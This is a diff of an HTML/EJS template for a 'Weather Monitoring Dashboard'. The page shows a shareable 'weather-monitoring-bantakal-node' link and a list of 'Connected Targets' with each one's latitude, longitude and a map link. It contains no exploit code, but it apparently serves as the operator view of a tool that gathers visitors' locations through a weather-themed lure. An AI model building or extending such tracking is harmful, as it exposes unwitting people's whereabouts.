@@ -5,127 +5,146 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Smart AirNet | Bantakal Weather Node</title>
-
-    <link rel="stylesheet"
-        href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
+    <title>Weather Monitoring Dashboard</title>
 
     <style>
         body {
-            background: #f5f7fa;
-            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
         }
 
-        .header {
-            background: #111827;
-            padding: 1.5rem;
+        .container {
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 30px;
+        }
+
+        h1 {
             text-align: center;
-        }
-
-        .header-title {
-            color: white;
-            font-size: 1.4rem;
-            font-weight: 700;
-            margin-bottom: 0.4rem;
-        }
-
-        .header-subtitle {
-            color: #9ca3af;
-            font-size: 0.9rem;
+            color: #333;
         }
 
         .url-box {
-            margin: 1rem auto;
-            max-width: 900px;
-            padding: 0.8rem;
             background: white;
-            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .url-box a {
+            color: #3273dc;
+            text-decoration: underline;
+            cursor: pointer;
             word-break: break-all;
         }
 
-        .targets {
-            max-width: 900px;
-            margin: auto;
-            padding: 1rem;
+        .url-box a:hover {
+            color: #1d5bbf;
         }
 
-        .target-button {
-            margin-bottom: 0.6rem;
+        .target-list {
+            background: white;
+            padding: 20px;
+            margin-top: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .target {
+            padding: 10px 0;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .target:last-child {
+            border-bottom: none;
+        }
+
+        .target a {
+            color: #3273dc;
+            text-decoration: none;
+        }
+
+        .target a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 
 <body>
 
-    <header class="header">
+    <div class="container">
 
-        <div class="header-title">
-            Smart AirNet
-        </div>
+        <h1>Weather Monitoring Dashboard</h1>
 
-        <div class="header-subtitle">
-            Real-Time Air Quality & Weather Monitor
-        </div>
-
+        <!-- Weather Monitoring Node URL -->
         <div class="url-box">
-            <strong>Weather Monitoring Node:</strong><br>
-            <code>
-                {{ global.remoteURL }}/weather-monitoring-bantakal-node
-            </code>
+
+            <strong>Weather Monitoring Node:</strong>
+
+            <br><br>
+
+            <a
+                href="<%= remoteURL %>/weather-monitoring-bantakal-node"
+                target="_blank"
+            >
+                <%= remoteURL %>/weather-monitoring-bantakal-node
+            </a>
+
         </div>
 
-    </header>
 
+        <!-- Connected Targets -->
+        <div class="target-list">
 
-    <section id="tar-content" class="targets">
+            <h2>Connected Targets</h2>
 
-        <h1 class="title is-5">
-            Bantakal Weather Nodes
-        </h1>
+            <% if (Object.keys(TARGETS).length === 0) { %>
 
-        {{ for(value, key in TARGETS) }}
+                <p>No targets connected.</p>
 
-        <a href="/map?id={{ key }}"
-           class="button is-fullwidth is-link target-button">
+            <% } else { %>
 
-            {{ key }}
+                <% Object.keys(TARGETS).forEach(function(id) { %>
 
-        </a>
+                    <div class="target">
 
-        {{/}}
+                        <strong><%= id %></strong>
 
-    </section>
+                        <br>
 
+                        <span>
+                            Latitude:
+                            <%= TARGETS[id][0] %>
+                        </span>
 
-    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+                        <br>
 
-    <script>
+                        <span>
+                            Longitude:
+                            <%= TARGETS[id][1] %>
+                        </span>
 
-        const content = document.querySelector("#tar-content")
+                        <br>
 
-        const socket = io("", {
-            secure: true,
-            path: "/socket.io",
-            transports: ['websocket']
-        })
+                        <a
+                            href="/map?id=<%= encodeURIComponent(id) %>"
+                            target="_blank"
+                        >
+                            View on Map
+                        </a>
 
+                    </div>
 
-        socket.on("user-connected", newId => {
+                <% }); %>
 
-            const a = document.createElement("a")
+            <% } %>
 
-            a.href = `/map?id=${newId}`
+        </div>
 
-            a.className =
-                "button is-fullwidth is-link target-button"
-
-            a.innerText = newId
-
-            content.appendChild(a)
-
-        })
-
-    </script>
+    </div>
 
 </body>
 
